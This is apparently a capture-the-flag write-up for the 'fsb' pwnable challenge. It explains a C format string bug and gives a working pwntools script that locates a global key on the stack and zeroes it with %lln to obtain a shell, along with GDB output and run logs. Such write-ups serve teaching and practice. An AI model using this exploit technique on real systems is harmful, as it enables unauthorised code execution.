This challenge is all about format strings.
If you feel rusty on them you can check out the [revision](#fstring_revision) section bellow,
it gives a brief summary on everything you need to know about them to do the exploit.

Now to the actual challenge, let's take a look at `fsb.c`:
```c
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
	char* args[]={"/bin/sh", 0};
	int i;

	char*** pargv = &argv;
	char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
	*pargv=0;
	*penvp=0;

	for(i=0; i<4; i++){
		printf("Give me some format strings(%d)\n", i+1);
		read(0, buf, 100);
		printf(buf);
	}

	printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
	return 0;
}

int main(int argc, char* argv[], char** envp){

	int fd = open("/dev/urandom", O_RDONLY);
	if( fd==-1 || read(fd, &key, 8) != 8 ){
		printf("Error, tell admin\n");
		return 0;
	}
	close(fd);

	alloca(0x12345 & key);

	fsb(argv, envp); // exploit this format string bug!
	return 0;
}
```
In the `main` function the program reads some random data into the 8-byte `key` variable,
then it [allocates some bytes on the stack](https://www.man7.org/linux/man-pages/man3/alloca.3.html)
and calls `fsb` which is evidently an abbreviation for "format string bug".
The `fsb` function deletes the arguments and environment of the program
then calls `printf` four times with format strings passed to `stdin`
and get's the user shell if they can guess the contents of `key`.

As to how to exploit the format strings I got two ideas:

- Read from `key`.
- Write to `key`.

For either of the approaches to work there has to be a pointer to `key` somewhere on the stack to refer to with a format specifier.
Let's check for that in GDB:
```
❯ readelf -s fsb | grep key
    52: 0804a060     8 OBJECT  GLOBAL DEFAULT   25 key
           ^
           |_____ fetch address of key.
❯ gdb fsb
...
(gdb) b *0x08048759       <---------- break before alloca().
Breakpoint 1 at 0x8048759
(gdb) r
...
Breakpoint 1, 0x08048759 in main ()
(gdb) set $eax = 0        <---------- tamper with eax to make alloca(key & 12345) equivalent to alloca(0).
(gdb) b *0x08048610       <---------- break at call printf(buf) in fsb.
Breakpoint 2 at 0x8048610
(gdb) c
Continuing.
Give me some format strings(1)
whatever man

Breakpoint 2, 0x08048610 in fsb ()
(gdb) x/60x $esp
0xffffcbf0:	0x0804a100	0x0804a100	0x00000064	0x0804828c
0xffffcc00:	0x0804a024	0x0804838c	0x0804823c	0xffffcc74
0xffffcc10:	0xf7d8a500	0x08048870	0x00000000	0x00000000
0xffffcc20:	0xffffce88	0xffffdfe8	0xffffcc40	0xffffcc44
0xffffcc30:	0xffffcc88	0xf7fdbec0	0xffffcc88	0x08048791
0xffffcc40:	0x00000000	0x00000000	0x080487a0	0x0804874e
0xffffcc50:	0x00000003	0x0804a060	0x00000008	0x00000000
...                                  ^
                                     |_____ as you can see address of key is at esp + 100.
```
What may come as a hindrance is that the `key` address could be anywhere given that `alloca` can allocate
up to `0x12345` bytes on the stack.
What we know is that it lies at least 100 bytes after `esp`.
We can try finding where it is by sending as input format strings like the following:
```
"%25$p %26$p %27$p ... " - prints [esp + 100], [esp + 104], [esp + 108] ...
```
With a 100 bytes format string we can search for `key` in the range `[esp + 100, esp + 160]`
We could also scan the stack further with consecutive queries but there is really no need to,
the number of bytes `alloca` allocated is `key & 0x12345 = key & 0b10010001101000101` so
the chance that the 5 most significant 1's get zeroed by the `&` is $\frac{1}{2^5} = \frac{1}{32}$,
this is easily bruteforceabe.

Now for the choice between reading and writing, it my seem like the two approaches are identical
but trust me, reading won't work (see [sidenode](#bug)) so just do writing.

Here is the final exploit implementing it all:
```python
from pwn import *

key = b'0x804a060'

while True:
    proc = process('./fsb', env={})

    proc.recvline()

    # get values in range [esp + 100, esp + 160].
    p = ' '.join('%{}$p'.format(i) for i in range(25, 25 + 16))
    proc.sendline(p.encode())
    vals = proc.recvline()

    # check for key address in vals.
    idx = next((i for i, x in enumerate(vals.split(b' ')) if x == key), None)
    if idx is None:
        proc.kill()
        continue

    # overwrite key with 0.
    p = '%{}$lln'.format(25 + idx)
    for i in range(3):
        # it's best to receive or else read() might consume more than a single line.
        proc.recvline()
        proc.sendline(p.encode())
        proc.recvline()

    # send 0 to be compared with key.
    proc.sendline(b'0')

    proc.interactive()
    proc.kill()
    exit(0)
```

```
fsb@pwnable:~$ python /tmp/fsb/script.py
[+] Starting local process './fsb': pid 354254
[*] Stopped process './fsb' (pid 354254)
...
[+] Starting local process './fsb': pid 354274
[*] Switching to interactive mode
Give me some format strings(4)

6$p 0x80483bd 0x1 0xf 0x8049ff4 0x10 0xf7705000 0xf7705000 (nil) 0x3 0xffefa1f0 (nil) (nil) 0xf756a647 0xf7705000
Wait a sec...
key :
Congratz!
$ ls
flag  fsb  fsb.c
$ cat flag
...(flag)...
```

<details id="fstring_revision">
<summary style="font-size: 1.2em;">
Quick revision on format strings
</summary>

Unlike typical C functions `printf` takes variadic number of arguments.
When a format specifier is encountered `printf` assumes that a
corresponding argument is passed at appropriate offset on the stack.
i.e. `printf("%i$p")` would print the `i`-th dword on the stack following the format string pointer.
It's the programmer's responsibility to actually pass that argument.
If they don't they would be reading random junk.
Here is a visualization of how `printf` sees the stack (at function entry):
```
 _____________
|_return_addr_|
|_fstring_ptr_|
|____arg1_____|
|____arg2_____|
|____arg3_____|
|____arg4_____|
|    ....     |
|____arg*_____|
```

As for the format specifiers there are
[plenty](https://www.man7.org/linux/man-pages/man3/printf.3.html)
of them, here are those of significance to us:
```
%p - formats the argument as a pointer
%n - writes the number of characters output by printf so far to the 4-byte cell referenced by the argument.
%lln - same as %n but assumes argument is a long long *
```

An example usage of `%n`:
```
int key = 0;
printf("some chars %n", &key);
assert(key == 11);
```
</details>

<details id="bug">
<summary style="font-size: 1.2em;">
A sidenote about a bug in the binary
</summary>

What if I told you that even if you knew the original `key` either by reading
it from the format strings or via some magic you wouldn't be able to get shell by passing it to the key prompt
(that is `pw == key` would always evaluate to `false`).
The reason for this is that there is actually a discrepancy between the assembly and the C code!

C source:
```c
unsigned long long pw = strtoull(buf2, 0, 10);
if(pw == key){
        printf("Congratz!\n");
        execve(args[0], args, 0);
        return 0;
}
```
Assembly output:
```asm
0x0804865f <+299>:	mov    DWORD PTR [esp+0x8],0xa
0x08048667 <+307>:	mov    DWORD PTR [esp+0x4],0x0
0x0804866f <+315>:	mov    DWORD PTR [esp],0x804a080
0x08048676 <+322>:	call   0x8048460 <strtoull@plt>     ; call strtoull(buf2, 0, 10) result is 8 bites thus stored in eax and edx
0x0804867b <+327>:	mov    edx,eax                      ; discard edx thus half of the result???
0x0804867d <+329>:	sar    edx,0x1f
0x08048680 <+332>:	mov    DWORD PTR [ebp-0x30],eax
0x08048683 <+335>:	mov    DWORD PTR [ebp-0x2c],edx
0x08048686 <+338>:	mov    eax,ds:0x804a060
0x0804868b <+343>:	mov    edx,DWORD PTR ds:0x804a064
0x08048691 <+349>:	mov    ecx,edx
0x08048693 <+351>:	xor    ecx,DWORD PTR [ebp-0x2c]
0x08048696 <+354>:	xor    eax,DWORD PTR [ebp-0x30]
0x08048699 <+357>:	or     eax,ecx
0x0804869b <+359>:	test   eax,eax
0x0804869d <+361>:	jne    0x80486cc <fsb+408>          ; bad branch
```
While in the C snippet the result of `strtoull` is an 8-byte integer
in assembly it is treated as a 4-byte integer and being cast (via sign extension) to an 8-byte integer.
My best guess as to why that happens is that somehow during compilation of the translation unit
a wrong prototype was used for `strtoull` like so:
```c
#include <stdio.h>
// erroneous! should be unsigned long long strtoull(...)
int strtoull(char *c, char**p, int base);

int main() {
	printf("%llx", strtoull("0xdeadbeefaabbccdd", 0, 16));
}
```
The above code prints `aabbccdd` when dynamically linked with `libc`.
</details>

